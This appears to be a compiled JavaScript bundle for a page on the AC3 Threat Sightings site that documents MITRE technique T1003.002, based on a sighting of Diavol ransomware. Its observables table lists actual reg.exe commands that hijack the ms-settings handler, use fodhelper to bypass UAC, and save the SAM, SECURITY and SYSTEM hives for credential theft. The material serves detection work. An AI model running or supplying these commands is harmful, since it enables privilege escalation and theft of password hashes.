"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[9563],{4137:function(e,t,r){r.d(t,{Zo:function(){return u},kt:function(){return d}});var n=r(7294);function a(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function i(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,n)}return r}function s(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?i(Object(r),!0).forEach((function(t){a(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):i(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function o(e,t){if(null==e)return{};var r,n,a=function(e,t){if(null==e)return{};var r,n,a={},i=Object.keys(e);for(n=0;n<i.length;n++)r=i[n],t.indexOf(r)>=0||(a[r]=e[r]);return a}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(n=0;n<i.length;n++)r=i[n],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(a[r]=e[r])}return a}var c=n.createContext({}),l=function(e){var t=n.useContext(c),r=t;return e&&(r="function"==typeof e?e(t):s(s({},t),e)),r},u=function(e){var t=l(e.components);return n.createElement(c.Provider,{value:t},e.children)},m={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},p=n.forwardRef((function(e,t){var r=e.components,a=e.mdxType,i=e.originalType,c=e.parentName,u=o(e,["components","mdxType","originalType","parentName"]),p=l(r),d=a,g=p["".concat(c,".").concat(d)]||p[d]||m[d]||i;return r?n.createElement(g,s(s({ref:t},u),{},{components:r})):n.createElement(g,s({ref:t},u))}));function d(e,t){var r=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var i=r.length,s=new Array(i);s[0]=p;var o={};for(var c in t)hasOwnProperty.call(t,c)&&(o[c]=t[c]);o.originalType=e,o.mdxType="string"==typeof e?e:a,s[1]=o;for(var l=2;l<i;l++)s[l]=r[l];return n.createElement.apply(null,s)}return n.createElement.apply(null,r)}p.displayName="MDXCreateElement"},5123:function(e,t,r){r.r(t),r.d(t,{frontMatter:function(){return o},contentTitle:function(){return c},metadata:function(){return l},toc:function(){return u},default:function(){return p}});var n=r(7462),a=r(3366),i=(r(7294),r(4137)),s=["components"],o={},c=void 0,l={unversionedId:"Techniques/T1003.002 - Security Account Manager",id:"Techniques/T1003.002 - Security Account Manager",isDocsHomePage:!1,title:"T1003.002 - Security Account Manager",description:"Found 1 references across 1 AC3 Threat Sightings. Enjoy!",source:"@site/docs/05-Techniques/T1003.002 - Security Account Manager.md",sourceDirName:"05-Techniques",slug:"/Techniques/T1003.002 - Security Account Manager",permalink:"/ac3-threat-sightings/docs/Techniques/T1003.002 - Security Account Manager",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"T1003.001 - OS Credential Dumping- LSASS Memory",permalink:"/ac3-threat-sightings/docs/Techniques/T1003.001 - OS Credential Dumping- LSASS Memory"},next:{title:"T1003.003 - OS Credential Dumping- NTDS",permalink:"/ac3-threat-sightings/docs/Techniques/T1003.003 - OS Credential Dumping- NTDS"}},u=[{value:"From the AC3 Threat Sighting for <em>Diavol Ransomware</em>",id:"from-the-ac3-threat-sighting-for-diavol-ransomware",children:[]}],m={toc:u};function p(e){var t=e.components,r=(0,a.Z)(e,s);return(0,i.kt)("wrapper",(0,n.Z)({},m,r,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("p",null,"Found 1 references across 1 AC3 Threat Sightings. Enjoy!"),(0,i.kt)("h2",{id:"from-the-ac3-threat-sighting-for-diavol-ransomware"},"From the AC3 Threat Sighting for ",(0,i.kt)("em",{parentName:"h2"},"Diavol Ransomware")),(0,i.kt)("p",null,"Full details at: ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Diavol_Ransomware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Diavol_Ransomware.yml")),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,i.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used a ",(0,i.kt)("em",{parentName:"td"},"CMD")," batch script to dump SAM, SECURITY and SYSTEM registry hives via Reg.exe for Credential Access."),(0,i.kt)("td",{parentName:"tr",align:null},"Dumped SAM, SECURITY and SYSTEM registry hives using a batch script named 'fodhelper_reg_hashes.bat'."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\"reg.exe save hklm\\\\sam c:\\\\ProgramData\\\\sam.save\\" /f'),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\"DelegateExecute\\" /f fodhelper.exe'),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\"reg.exe save hklm\\\\security c:\\\\ProgramData\\\\security.save\\" /f'),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\"DelegateExecute\\" /f fodhelper.exe'),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\"reg.exe save hklm\\\\system c:\\\\ProgramData\\\\system.save\\" /f'),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\"DelegateExecute\\" /f fodhelper.exe'),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"reg.exe delete hkcu\\\\software\\\\classes\\\\ms-settings /f >nul 2>&1"))))))}p.isMDXComponent=!0}}]);